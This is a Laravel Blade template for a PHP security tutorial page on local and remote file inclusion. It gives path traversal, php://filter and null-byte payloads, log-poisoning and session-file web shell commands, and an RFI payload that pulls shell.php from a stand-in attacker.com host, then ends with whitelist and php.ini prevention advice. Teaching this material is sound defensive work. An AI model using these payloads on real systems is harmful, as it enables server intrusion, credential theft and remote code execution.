@extends('layouts.app')
@section('title', 'LFI / RFI in PHP - Notes')
@section('content')
<style>
    @import url('https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=IBM+Plex+Mono:wght@400;500&display=swap');
    :root{--bg:#0a0e17;--surface:#0f1522;--border:#1e2d45;--accent:#00c2ff;--accent2:#7b61ff;--text:#c9d8ef;--muted:#566a85;--green:#00e5a0;--red:#ff4d6d;--yellow:#f0b429;--orange:#ff9f43;}
    .post-root{background:var(--bg);font-family:'Syne',sans-serif;min-height:100vh;color:var(--text);}
    .post-topbar{border-bottom:1px solid var(--border);background:var(--surface);padding:12px 0;position:sticky;top:0;z-index:50;backdrop-filter:blur(8px);}
    .post-topbar-inner{max-width:960px;margin:0 auto;padding:0 32px;}
    .breadcrumb{display:flex;align-items:center;gap:8px;font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--muted);flex-wrap:wrap;}
    .breadcrumb a{color:var(--muted);text-decoration:none;} .breadcrumb a:hover{color:var(--accent);} .breadcrumb-sep{opacity:.35;font-size:10px;} .breadcrumb-current{color:var(--text);}
    .post-body{max-width:960px;margin:0 auto;padding:48px 32px 100px;}
    .article-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;overflow:hidden;}
    .article-card-inner{padding:48px;}
    .cat-badge{display:inline-flex;align-items:center;gap:7px;font-family:'IBM Plex Mono',monospace;font-size:10px;padding:4px 12px;border-radius:3px;text-transform:uppercase;letter-spacing:.08em;margin-bottom:24px;background:rgba(255,159,67,0.1);color:var(--orange);border:1px solid rgba(255,159,67,0.25);}
    .article-title{font-size:clamp(26px,4vw,38px);font-weight:800;color:#fff;line-height:1.15;letter-spacing:-.02em;margin-bottom:20px;}
    .meta-row{display:flex;flex-wrap:wrap;gap:20px;margin-bottom:28px;padding-bottom:28px;border-bottom:1px solid var(--border);}
    .meta-item{display:flex;align-items:center;gap:7px;font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--muted);} .meta-item svg{width:13px;height:13px;}
    .read-btn{display:inline-flex;align-items:center;gap:8px;background:transparent;border:1px solid var(--border);border-radius:6px;padding:9px 18px;font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--text);cursor:pointer;transition:all .2s;margin-bottom:40px;} .read-btn:hover{border-color:var(--orange);color:var(--orange);}
    .article-prose{line-height:1.8;font-size:15px;color:var(--text);}
    .article-prose h2{font-size:24px;font-weight:800;color:#fff;margin:48px 0 20px;}
    .article-prose h3{font-size:18px;font-weight:700;color:var(--orange);margin:40px 0 16px;font-family:'IBM Plex Mono',monospace;display:flex;align-items:center;gap:10px;} .article-prose h3::before{content:'//';color:var(--accent2);font-size:14px;opacity:.7;}
    .article-prose p{margin-bottom:16px;} .article-prose strong{color:#fff;} .article-prose a{color:var(--accent);text-decoration:underline;}
    .article-prose ul{list-style:none;padding:0;margin-bottom:20px;display:flex;flex-direction:column;gap:10px;} .article-prose ul li{padding-left:20px;position:relative;} .article-prose ul li::before{content:'›';position:absolute;left:0;color:var(--orange);font-size:16px;line-height:1.6;}
    .article-prose pre{background:#060a12;border:1px solid var(--border);border-radius:8px;padding:20px 24px;overflow-x:auto;margin:24px 0;position:relative;} .article-prose pre code{font-family:'IBM Plex Mono',monospace;font-size:13px;color:#00e5a0;background:none;padding:0;}
    .article-prose code{font-family:'IBM Plex Mono',monospace;font-size:13px;background:rgba(255,159,67,0.08);color:var(--orange);padding:2px 7px;border-radius:3px;border:1px solid rgba(255,159,67,0.2);}
    .copy-code{position:absolute!important;top:10px;right:10px;background:var(--surface);border:1px solid var(--border);border-radius:4px;color:var(--muted);padding:4px 10px;font-family:'IBM Plex Mono',monospace;font-size:10px;cursor:pointer;} .copy-code:hover{border-color:var(--orange);color:var(--orange);} .copy-code.copied{border-color:var(--green);color:var(--green);}
    .callout{border-radius:8px;padding:18px 22px;margin:24px 0;display:flex;gap:14px;align-items:flex-start;} .callout-icon{font-size:18px;flex-shrink:0;margin-top:2px;} .callout p{margin:0;font-size:14px;line-height:1.7;} .callout strong{font-weight:700;}
    .callout-warning{background:rgba(240,180,41,0.06);border:1px solid rgba(240,180,41,0.25);} .callout-warning p{color:#f5d67a;} .callout-warning strong{color:var(--yellow);}
    .callout-info{background:rgba(255,159,67,0.05);border:1px solid rgba(255,159,67,0.2);} .callout-info p{color:var(--text);} .callout-info strong{color:var(--orange);}
    .callout-success{background:rgba(0,229,160,0.05);border:1px solid rgba(0,229,160,0.25);} .callout-success p{color:#7ff3cd;} .callout-success strong{color:var(--green);}
    .callout-danger{background:rgba(255,77,109,0.05);border:1px solid rgba(255,77,109,0.25);} .callout-danger p{color:#ffb3c0;} .callout-danger strong{color:var(--red);}
    @media(max-width:768px){.post-body{padding:24px 16px 60px;}.article-card-inner{padding:24px;}.post-topbar-inner{padding:0 16px;}}
</style>

<div class="post-root">
    <div class="post-topbar"><div class="post-topbar-inner">
        <nav class="breadcrumb">
            <a href="{{ route('home') }}">Home</a><span class="breadcrumb-sep">›</span>
            <a href="{{ route('posts.index') }}">Notes</a><span class="breadcrumb-sep">›</span>
            <a href="{{ route('posts.index') }}?category=php">PHP Security</a><span class="breadcrumb-sep">›</span>
            <span class="breadcrumb-current">LFI / RFI</span>
        </nav>
    </div></div>

    <div class="post-body"><div class="article-card"><div class="article-card-inner">
        <div><span class="cat-badge">PHP Security</span></div>
        <h1 class="article-title">Local & Remote File Inclusion (LFI / RFI)</h1>
        <div class="meta-row">
            <div class="meta-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>Youssef</div>
            <div class="meta-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="4" width="18" height="18" rx="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>{{ now()->format('d M Y') }}</div>
            <div class="meta-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>0 views</div>
        </div>
        <button id="read-btn" class="read-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><path d="M15.54 8.46a5 5 0 0 1 0 7.07"/></svg>Read Aloud</button>

        <div class="article-prose" id="article-content">

            <h2>File Inclusion Vulnerabilities in PHP</h2>

            <h3>Understanding the Vulnerability</h3>
            <p>PHP's <code>include()</code>, <code>require()</code>, <code>include_once()</code>, and <code>require_once()</code> functions dynamically load and execute PHP files. When the path passed to these functions is controlled by user input, an attacker can load arbitrary files from the server (LFI) or from a remote server (RFI).</p>

            <pre><code>// Classic vulnerable pattern
$page = $_GET['page'];
include($page . '.php');

// Also vulnerable — no extension appended
include($_GET['file']);</code></pre>

            <h3>Local File Inclusion (LFI)</h3>
            <p>LFI allows reading arbitrary files from the server's filesystem. The attacker uses path traversal sequences to escape the intended directory.</p>

            <pre><code>// Basic path traversal
?page=../../../../etc/passwd
?page=....//....//....//etc/passwd   // bypass basic filter
?page=..%2F..%2F..%2Fetc%2Fpasswd   // URL encoded

// Interesting files to read on Linux
/etc/passwd
/etc/shadow          // if running as root
/proc/self/environ   // environment variables (contains HTTP headers!)
/proc/self/cmdline   // process command line
/var/log/apache2/access.log   // for log poisoning
/var/log/nginx/access.log
/tmp/sess_[PHPSESSID]         // PHP session file</code></pre>

            <h3>PHP Stream Wrappers (LFI bypass + source disclosure)</h3>
            <p>PHP wrappers allow reading files in different formats without triggering PHP execution — critical for extracting source code.</p>
            <pre><code>// Base64-encode the PHP source (bypasses .php extension execution)
?page=php://filter/convert.base64-encode/resource=index
// Response: base64 encoded PHP source → decode to read credentials

// Read as plain text
?page=php://filter/read=string.rot13/resource=index

// Read any file
?page=php://filter/resource=/etc/passwd</code></pre>

            <h3>LFI to RCE — Log Poisoning</h3>
            <p>If you can read the web server's access log via LFI, you can poison it with PHP code by injecting it into the User-Agent header. The next LFI request executes the poisoned log entry.</p>
            <pre><code># Step 1: Poison the log with PHP payload in User-Agent
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://target.com/

# Step 2: Include the log via LFI
?page=../../../../var/log/apache2/access.log&cmd=id

# Result: executes id on the server</code></pre>

            <h3>LFI to RCE — /proc/self/environ</h3>
            <pre><code># Inject PHP in User-Agent
curl -H "User-Agent: <?php system(\$_GET['c']); ?>" http://target.com/

# Include the environ file
?page=../../../../proc/self/environ&c=whoami</code></pre>

            <h3>LFI to RCE — PHP Session File</h3>
            <pre><code># PHP stores sessions in /tmp/sess_SESSIONID
# 1. Set a session cookie and inject PHP in a parameter that gets stored in session:
?username=<?php system($_GET['cmd']); ?>

# 2. Include the session file:
?page=../../../../tmp/sess_abc123&cmd=id</code></pre>

            <h3>LFI — Null Byte Bypass (PHP < 5.3.4)</h3>
            <pre><code>// Code appends .php extension:
include($page . '.php');

// Bypass with null byte — truncates the string at %00
?page=../../../../etc/passwd%00

// The include becomes: include("../../../../etc/passwd");</code></pre>

            <h3>Remote File Inclusion (RFI)</h3>
            <p>RFI requires <code>allow_url_include = On</code> in php.ini (disabled by default in modern PHP). If enabled, the attacker can include a remote PHP file they control, achieving instant RCE.</p>
            <pre><code>// Attacker hosts: http://attacker.com/shell.php
// Content: <?php system($_GET['cmd']); ?>

// RFI payload
?page=http://attacker.com/shell

// PHP fetches and executes the remote file → RCE</code></pre>

            <h3>Detection Checklist</h3>
            <ul>
                <li>Look for parameters named: <code>page</code>, <code>file</code>, <code>path</code>, <code>include</code>, <code>template</code>, <code>doc</code>, <code>view</code>, <code>lang</code></li>
                <li>Try <code>../../etc/passwd</code> as the value</li>
                <li>Try <code>php://filter/convert.base64-encode/resource=index</code></li>
                <li>Check if <code>allow_url_include</code> is on (try <code>?page=http://attacker.com/test</code>)</li>
            </ul>

            <h3>Prevention</h3>
            <pre><code>// SAFE — whitelist approach only
$allowed = ['home', 'about', 'contact'];
$page = in_array($_GET['page'], $allowed) ? $_GET['page'] : 'home';
include($page . '.php');

// php.ini hardening
allow_url_include = Off
allow_url_fopen = Off
open_basedir = /var/www/html</code></pre>

            <div class="callout callout-success">
                <div class="callout-icon">✅</div>
                <p><strong>Key Insight:</strong> Never pass user input directly to file inclusion functions. Use a whitelist. Even with a whitelist, path traversal sequences should be stripped or rejected. Set <code>open_basedir</code> as a defense-in-depth measure.</p>
            </div>

        </div>
    </div></div></div>
</div>
@endsection
@section('scripts')
<script>
document.addEventListener('DOMContentLoaded',function(){document.querySelectorAll('pre').forEach(pre=>{pre.style.position='relative';const btn=document.createElement('button');btn.className='copy-code';btn.textContent='copy';pre.appendChild(btn);btn.addEventListener('click',()=>{const code=pre.querySelector('code')?.textContent??pre.textContent;navigator.clipboard.writeText(code).then(()=>{btn.textContent='copied!';btn.classList.add('copied');setTimeout(()=>{btn.textContent='copy';btn.classList.remove('copied');},2000);});});});const r=document.getElementById('read-btn');const c=document.getElementById('article-content');if(r&&c){let reading=false;r.addEventListener('click',()=>{if(!reading){const u=new SpeechSynthesisUtterance(c.innerText);u.lang='en-US';speechSynthesis.speak(u);reading=true;r.textContent='Stop';u.onend=()=>{reading=false;r.textContent='Read Aloud'};}else{speechSynthesis.cancel();reading=false;r.textContent='Read Aloud';}});}});
</script>
@endsection
